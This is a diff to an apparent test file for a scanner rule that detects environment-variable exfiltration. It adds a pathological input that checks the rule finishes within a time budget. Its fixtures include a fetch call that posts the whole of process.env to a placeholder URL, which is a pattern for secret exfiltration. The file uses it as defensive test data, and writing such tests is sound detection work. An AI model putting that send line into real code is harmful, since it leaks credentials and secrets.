@@ -935,7 +935,8 @@ describe('NET-EXFIL-ENV flow cost on hostile Python', () => {
 
 describe('NET-EXFIL-ENV flow cost on hostile JavaScript', () => {
   // Each shape is quadratic for a flow that checks every declaration of a name at each use, scans
-  // each value to its end, or scans the arguments of every enclosing send.
+  // each value to its end, scans the arguments of every enclosing send, or walks back through a
+  // comment from each key in it.
   const FLOW_BUDGET_MS = 2_000;
   const SEND = 'fetch(URL, { body: JSON.stringify({ ...process.env }) })\n';
   const HOSTILE_SHAPES = [
@@ -950,6 +951,10 @@ describe('NET-EXFIL-ENV flow cost on hostile JavaScript', () => {
     {
       shape: '10,000 nested sends',
       content: `${'fetch('.repeat(10_000)}{ ...process.env }${')'.repeat(10_000)}\n`,
+    },
+    {
+      shape: '200,000 env keys in one comment',
+      content: `spawn(cmd, {})\n/* ${'env: '.repeat(200_000)} */\n${SEND}`,
     },
   ];
   let tmpDir: string;
